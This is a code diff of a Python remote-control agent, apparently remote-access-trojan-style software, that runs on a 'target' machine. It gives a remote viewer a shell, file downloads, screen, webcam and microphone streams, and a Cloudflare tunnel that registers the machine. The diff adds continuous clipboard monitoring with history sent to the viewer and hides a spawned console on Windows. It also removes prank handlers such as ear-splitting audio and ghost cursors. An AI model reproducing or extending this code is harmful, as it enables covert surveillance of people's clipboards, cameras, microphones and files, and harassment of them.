@@ -8,6 +8,8 @@ import subprocess
 import urllib.request
 import platform
 import base64
+import threading
+import argparse
 
 # FIX: Windows specific event loop policy to prevent "Task was destroyed but it is pending" errors
 # and improve stability with subprocesses/pipes.
@@ -111,17 +113,28 @@ class AsyncAgent:
         # New Handlers
         self.shell_handler = ShellHandler(
             on_output=self.on_shell_output,
-            on_exit=self.on_shell_exit
+            on_exit=self.on_shell_exit,
+            on_cwd=self.on_shell_cwd
         )
         self.process_mgr = ProcessManager()
         self.file_mgr = FileManager()
-        self.clipboard_handler = ClipboardHandler()
+        self.clipboard_handler = ClipboardHandler(on_change=self.on_clipboard_change)
         self.device_settings = DeviceSettings()
         self.troll_handler = TrollHandler()
         self.direct_ws_clients = set()
         self.direct_url = None
+        self.direct_server = None
         self.curtain = self.privacy # Alias for compatibility
         
+        # State
+        self.streaming = False
+        self._stream_task = None 
+        self.cam_streaming = False
+        self.mic_streaming = False
+        
+        # Kiosk Process
+        self.kiosk_process = None
+
     def _create_background_task(self, coro):
         """Helper to create fire-and-forget background tasks safely."""
         task = asyncio.create_task(coro)
@@ -145,12 +158,20 @@ class AsyncAgent:
 
         # Send to Direct Clients
         if self.direct_ws_clients and self.loop:
+            failed_clients = []
             for client in list(self.direct_ws_clients):
                 try:
                     asyncio.run_coroutine_threadsafe(
                         send_msg(client, msg),
                         self.loop
                     )
+                except Exception as e:
+                    print(f"[-] Failed to send to direct client: {e}")
+                    failed_clients.append(client)
+            # Remove failed clients
+            for client in failed_clients:
+                try:
+                    self.direct_ws_clients.discard(client)
                 except Exception:
                     pass
 
@@ -160,20 +181,19 @@ class AsyncAgent:
     def on_shell_exit(self, code):
         import struct
         self._send_async(protocol.OP_SHELL_EXIT, struct.pack('<i', code))
-        
-        # State
-        self.streaming = False
-        self._stream_task = None # Retain original _stream_task
-        self.cam_streaming = False
-        self.mic_streaming = False
-        
-        # Direct Server State
-        self.direct_server = None
-        self.direct_ws_clients = set()
-        self.direct_url = None
-        
-        # Kiosk Process
-        self.kiosk_process = None
+
+    def on_shell_cwd(self, path):
+        self._send_async(protocol.OP_SHELL_CWD, path.encode('utf-8', errors='replace'))
+
+    def on_clipboard_change(self, entry):
+        """Called when clipboard content changes (from monitoring thread)."""
+        try:
+            data = json.dumps(entry).encode('utf-8')
+            self._send_async(protocol.OP_CLIP_ENTRY, data)
+        except Exception as e:
+            print(f"[-] Clipboard change send error: {e}")
+
+
 
 
 
@@ -315,13 +335,14 @@ class AsyncAgent:
                     self.webcam.stop()
 
                 elif opcode == protocol.OP_MIC_START:
-                    if self.mic.start():
-                        self.mic_streaming = True
-                        self._create_background_task(self.stream_mic(source_ws))
-                    else:
-                        # Send error back to viewer
-                        print("[!] Mic failed, notifying viewer...")
-                        await send_msg(source_ws, bytes([protocol.OP_ERROR]) + b"MIC:No microphone found")
+                    if not self.mic_streaming:
+                        if self.mic.start():
+                            self.mic_streaming = True
+                            self._create_background_task(self.stream_mic(source_ws))
+                        else:
+                            # Send error back to viewer
+                            print("[!] Mic failed, notifying viewer...")
+                            await send_msg(source_ws, bytes([protocol.OP_ERROR]) + b"MIC:No microphone found")
 
                 elif opcode == protocol.OP_MIC_STOP:
                     self.mic_streaming = False
@@ -348,9 +369,15 @@ class AsyncAgent:
                             if not os.path.exists(kiosk_script):
                                 print(f"[-] Kiosk script not found: {kiosk_script}")
                             else:
-                                # Run with same python
+                                # Run with same python, hide console on Windows
                                 try:
-                                    self.kiosk_process = subprocess.Popen([sys.executable, kiosk_script])
+                                    creation_flags = 0
+                                    if os.name == 'nt':
+                                        creation_flags = subprocess.CREATE_NO_WINDOW
+                                    self.kiosk_process = subprocess.Popen(
+                                        [sys.executable, kiosk_script],
+                                        creationflags=creation_flags
+                                    )
                                 except Exception as e:
                                     print(f"[-] Failed to launch kiosk: {e}")
                     else:
@@ -482,12 +509,6 @@ class AsyncAgent:
                         # Write input (enter is handled by handler or client)
                         if cmd:
                             await self.loop.run_in_executor(None, self.shell_handler.write_input, cmd)
-                            
-                        # FEATURE: Broadcast CWD update
-                        await asyncio.sleep(0.5) # Give it a moment to change dir
-                        cwd = await self.loop.run_in_executor(None, self.shell_handler.get_cwd)
-                        if cwd:
-                            self._send_async(protocol.OP_SHELL_CWD, cwd.encode('utf-8'))
                     except Exception as e:
                         print(f"[-] Shell Exec Error: {e}")
 
@@ -533,10 +554,40 @@ class AsyncAgent:
                         data = json.loads(payload.decode('utf-8'))
                         path = data.get('path')
                         if path:
-                            # Stream chunks
-                            for chunk in self.file_mgr.read_file_chunks(path):
-                                self._send_async(protocol.OP_FM_CHUNK, chunk)
-                                await asyncio.sleep(0.001) # Yield to event loop
+                            # Use executor to avoid blocking event loop
+                            async def read_chunks_async(file_path):
+                                queue = asyncio.Queue()
+                                
+                                def read_worker():
+                                    try:
+                                        for chunk in self.file_mgr.read_file_chunks(file_path):
+                                            asyncio.run_coroutine_threadsafe(
+                                                queue.put(chunk), self.loop
+                                            ).result()
+                                        # Signal end
+                                        asyncio.run_coroutine_threadsafe(
+                                            queue.put(None), self.loop
+                                        ).result()
+                                    except Exception as e:
+                                        print(f"[-] FM Read Worker Error: {e}")
+                                        asyncio.run_coroutine_threadsafe(
+                                            queue.put(None), self.loop
+                                        ).result()
+                                
+                                # Start worker thread
+                                threading.Thread(target=read_worker, daemon=True).start()
+                                
+                                # Read from queue
+                                while True:
+                                    chunk = await queue.get()
+                                    if chunk is None:
+                                        break
+                                    self._send_async(protocol.OP_FM_CHUNK, chunk)
+                                
+                                # Signal end of stream with empty chunk
+                                self._send_async(protocol.OP_FM_CHUNK, b'')
+                            
+                            await read_chunks_async(path)
                     except Exception as e:
                         print(f"[-] FM Download Error: {e}")
 
@@ -590,17 +641,38 @@ class AsyncAgent:
 
                 # CLIPBOARD
                 elif opcode == protocol.OP_CLIP_GET:
-                    # Fix: get_text -> get_clipboard
                     text = await self.loop.run_in_executor(None, self.clipboard_handler.get_clipboard)
                     self._send_async(protocol.OP_CLIP_DATA, text.encode('utf-8'))
 
                 elif opcode == protocol.OP_CLIP_SET:
                     try:
                         text = payload.decode('utf-8')
-                        # Fix: set_text -> set_clipboard
                         await self.loop.run_in_executor(None, self.clipboard_handler.set_clipboard, text)
                     except Exception as e:
                         print(f"[-] Clip Set Error: {e}")
+
+                elif opcode == protocol.OP_CLIP_HISTORY_REQ:
+                    # Send full clipboard history
+                    try:
+                        history = self.clipboard_handler.get_history()
+                        data = json.dumps(history).encode('utf-8')
+                        self._send_async(protocol.OP_CLIP_HISTORY_DATA, data)
+                    except Exception as e:
+                        print(f"[-] Clip History Error: {e}")
+
+                elif opcode == protocol.OP_CLIP_DELETE:
+                    # Delete entry by index
+                    try:
+                        data = json.loads(payload.decode('utf-8'))
+                        index = data.get('index', -1)
+                        if index >= 0:
+                            self.clipboard_handler.delete_entry(index)
+                            # Send updated history
+                            history = self.clipboard_handler.get_history()
+                            resp = json.dumps(history).encode('utf-8')
+                            self._send_async(protocol.OP_CLIP_HISTORY_DATA, resp)
+                    except Exception as e:
+                        print(f"[-] Clip Delete Error: {e}")
 
                 # DEVICE SETTINGS (Volume, etc)
                 # Network settings (WiFi/Ethernet) removed by user request
@@ -648,39 +720,11 @@ class AsyncAgent:
 
                 elif opcode == protocol.OP_GET_SYSINFO:
                     try:
+                        # Fix: Run blocking sysinfo in executor
                         info = await self.loop.run_in_executor(None, self.device_settings.get_sysinfo)
                         self._send_async(protocol.OP_SYSINFO_DATA, json.dumps(info).encode('utf-8'))
                     except Exception as e:
                         print(f"[-] SysInfo Error: {e}")
-
-
-                elif opcode == protocol.OP_TROLL_VIDEO:
-                    self.troll_handler.play_video(payload)
-                elif opcode == protocol.OP_TROLL_RANDOM_SOUND:
-                    data = json.loads(payload.decode('utf-8'))
-                    self.troll_handler.set_random_sound(data['enabled'], data.get('interval_ms', 5000))
-                elif opcode == protocol.OP_TROLL_ALERT_LOOP:
-                    data = json.loads(payload.decode('utf-8'))
-                    self.troll_handler.set_alert_loop(data['enabled'])
-                elif opcode == protocol.OP_TROLL_VOLUME_MAX:
-                    self.troll_handler.max_volume_sound()
-                elif opcode == protocol.OP_TROLL_EARRAPE:
-                    self.troll_handler.earrape()
-                elif opcode == protocol.OP_TROLL_WHISPER:
-                    data = json.loads(payload.decode('utf-8'))
-                    self.troll_handler.set_whisper(data['enabled'])
-                elif opcode == protocol.OP_TROLL_GHOST_CURSOR:
-                    data = json.loads(payload.decode('utf-8'))
-                    self.troll_handler.set_ghost_cursor(data['enabled'])
-                elif opcode == protocol.OP_TROLL_SHUFFLE_ICONS:
-                    self.troll_handler.shuffle_icons()
-                elif opcode == protocol.OP_TROLL_WALLPAPER:
-                    self.troll_handler.set_wallpaper(payload)
-                elif opcode == protocol.OP_TROLL_OVERLAY:
-                    data = json.loads(payload.decode('utf-8'))
-                    self.troll_handler.show_overlay(data['type'])
-                elif opcode == protocol.OP_TROLL_STOP:
-                    self.troll_handler.stop_all()
 
                 elif opcode == protocol.OP_DISCONNECT:
                     self.streaming = False
@@ -774,9 +818,9 @@ class AsyncAgent:
                     # ================================================================
                     try:
                         # 1. SysInfo
-                        info = self.device_settings.get_sysinfo()
+                        info = await self.loop.run_in_executor(None, self.device_settings.get_sysinfo)
                         self._send_async(protocol.OP_SYSINFO_DATA, json.dumps(info).encode('utf-8'))
-
+                        
                         # 2. Process List
                         procs = await self.loop.run_in_executor(None, self.process_mgr.list_processes)
                         pm_data = self.process_mgr.to_json(procs)
@@ -789,6 +833,10 @@ class AsyncAgent:
                         self._send_async(protocol.OP_FM_DATA, fm_resp)
                         
                         print("[+] Initial Data Pushed")
+                        
+                        # Start clipboard monitoring for real-time updates
+                        self.clipboard_handler.start_monitoring()
+                        print("[+] Clipboard Monitoring Started")
                     except Exception as e:
                         print(f"[-] Initial Push Partial Error: {e}")
 
@@ -809,15 +857,12 @@ class AsyncAgent:
                 print("[*] Reconnecting in 3 seconds...")
                 await asyncio.sleep(3)  # Faster retry
 
-
-                await asyncio.sleep(3)  # Faster retry
-
     async def _cwd_poll_loop(self):
         """Periodically poll CWD from shell handler and start sending updates"""
         while self.ws:
             try:
                 if self.shell_handler.running:
-                    cwd = self.shell_handler.get_cwd()
+                    cwd = await self.loop.run_in_executor(None, self.shell_handler.get_cwd)
                     if cwd:
                         self._send_async(protocol.OP_SHELL_CWD, cwd.encode('utf-8', errors='replace'))
             except Exception:
@@ -826,8 +871,9 @@ class AsyncAgent:
 
     async def handle_messages(self):
         """Broker Message Loop"""
-        # Start CWD Poller
-        self._create_background_task(self._cwd_poll_loop())
+        # DISABLED: CWD Poller sends stale data (psutil gets process cwd, not shell $pwd)
+        # Viewer now parses __CWD__ markers directly from shell output
+        # self._create_background_task(self._cwd_poll_loop())
         
         while True:
             msg = await recv_msg(self.ws)
@@ -850,8 +896,16 @@ class AsyncAgent:
         print(f"[*] Applying Settings: {settings}")
         quality = settings.get("quality", 50)
         scale = settings.get("scale", 90) / 100.0
+        method = settings.get("method", "mss")
+        fmt = settings.get("format", "WEBP")
+        
         # Recreate capturer with new settings
-        self.capturer = ScreenCapturer(quality=quality, scale=scale)
+        self.capturer = ScreenCapturer(
+            quality=quality, 
+            scale=scale,
+            method=method,
+            format=fmt
+        )
 
     async def stream_screen(self, target_ws=None):
         print("[*] Screen Streaming Task Started")
@@ -921,22 +975,26 @@ class AsyncAgent:
                     # If it's a fatal error, try to restart the stream
                     if failures > 5:
                         if restart_attempts >= MAX_RESTARTS:
-                            print("[!] Mic Max Restarts Reached. Aborting.")
-                            break
-                            
-                        print(f"[!] Restarting Mic Stream (Attempt {restart_attempts+1}/{MAX_RESTARTS})...")
+                             print("[-] Mic Max Restarts Exceeded.")
+                             break
+                        
+                        # Increment once per attempt scope
+                        restart_attempts += 1
+                        print(f"[*] Restarting Mic (Attempt {restart_attempts}/{MAX_RESTARTS})...")
                         self.mic.stop()
                         
-                        # Exponential Backoff
-                        await asyncio.sleep(2 ** restart_attempts)
-                        restart_attempts += 1
+                        # Backoff
+                        await asyncio.sleep(min(30, 2 ** restart_attempts))
                         
                         if self.mic.start():
-                            failures = 0
-                            continue  # Skip sleep, immediately retry loop
+                            failures = 0 
+                            print("[+] Mic Restored")
+                            continue
                         else:
-                            print("[-] Failed to restart Mic Stream")
-                            # Don't reset failures, let it loop and retry or fail
+                            print("[-] Mic Restart Failed.")
+                            # Increment failures to respect restart counter
+                            failures += 1
+                            await asyncio.sleep(5)
                     
                     await asyncio.sleep(0.1)
                 
@@ -963,45 +1021,48 @@ class AsyncAgent:
         except Exception:
             pass
 
-    def start(self):
+    def start(self, local_mode=False):
         # 1. Start Cloudflare Tunnel (Hybrid Mode)
-        try:
-            from target.tunnel_manager import TunnelManager
-            from target import config
-            import requests
-            
-            print("[*] Starting Cloudflare Tunnel...")
-            self.tunnel_mgr = TunnelManager(port=8765) # Using a fake port for now, or internal server
-            # Note: For real functionality, we need a local internal server. 
-            # For now, we will just establish the tunnel to prove connectivity logic.
-            # But wait, cloudflared needs an HTTP server to forward TO.
-            # The Broker is WebSocket. We need a local WS server for the Direct Link.
-            # Let's start the internal WS server first? 
-            # Actually, let's just implement the signaling for now.
-            
-            pub_url = self.tunnel_mgr.start()
-            if pub_url:
-                print(f"[+] Tunnel Established: {pub_url}")
-                # 2. Report to Registry
-                payload = {
-                    "id": self.my_id,
-                    "password": config.REGISTRY_PASSWORD,
-                    "username": config.AGENT_USERNAME,
-                    "url": pub_url
-                }
-                try:
-                    r = requests.post(f"{config.REGISTRY_URL}/update", json=payload, timeout=10)
-                    if r.status_code == 200:
-                        print(f"[+] Registered with Vercel: {config.REGISTRY_URL}")
-                    else:
-                        print(f"[-] Registry Update Failed: {r.text}")
-                except Exception as e:
-                    print(f"[-] Registry Connect Error: {e}")
-            else:
-                 print("[-] Tunnel Failed to Start")
-                 
-        except Exception as e:
-            print(f"[-] Hybrid Setup Error: {e}")
+        if not local_mode:
+            try:
+                from target.tunnel_manager import TunnelManager
+                from target import config
+                import requests
+                
+                print("[*] Starting Cloudflare Tunnel...")
+                self.tunnel_mgr = TunnelManager(port=8765) # Using a fake port for now, or internal server
+                # Note: For real functionality, we need a local internal server. 
+                # For now, we will just establish the tunnel to prove connectivity logic.
+                # But wait, cloudflared needs an HTTP server to forward TO.
+                # The Broker is WebSocket. We need a local WS server for the Direct Link.
+                # Let's start the internal WS server first? 
+                # Actually, let's just implement the signaling for now.
+                
+                pub_url = self.tunnel_mgr.start()
+                if pub_url:
+                    print(f"[+] Tunnel Established: {pub_url}")
+                    # 2. Report to Registry
+                    payload = {
+                        "id": self.my_id,
+                        "password": config.REGISTRY_PASSWORD,
+                        "username": config.AGENT_USERNAME,
+                        "url": pub_url
+                    }
+                    try:
+                        r = requests.post(f"{config.REGISTRY_URL}/update", json=payload, timeout=10)
+                        if r.status_code == 200:
+                            print(f"[+] Registered with Vercel: {config.REGISTRY_URL}")
+                        else:
+                            print(f"[-] Registry Update Failed: {r.text}")
+                    except Exception as e:
+                        print(f"[-] Registry Connect Error: {e}")
+                else:
+                     print("[-] Tunnel Failed to Start")
+                     
+            except Exception as e:
+                print(f"[-] Hybrid Setup Error: {e}")
+        else:
+            print("[*] Local Mode: Skipping Cloudflare Tunnel")
 
         # Start the asyncio loop
         self.loop = asyncio.new_event_loop()
@@ -1019,8 +1080,12 @@ class AsyncAgent:
             self.loop.close()
 
 def main():
+    parser = argparse.ArgumentParser(description="MyDesk Agent")
+    parser.add_argument("--local", action="store_true", help="Run in local mode (skip Cloudflare Tunnel)")
+    args = parser.parse_args()
+
     agent = AsyncAgent(DEFAULT_BROKER)
-    agent.start()
+    agent.start(local_mode=args.local)
 
 if __name__ == "__main__":
     main()
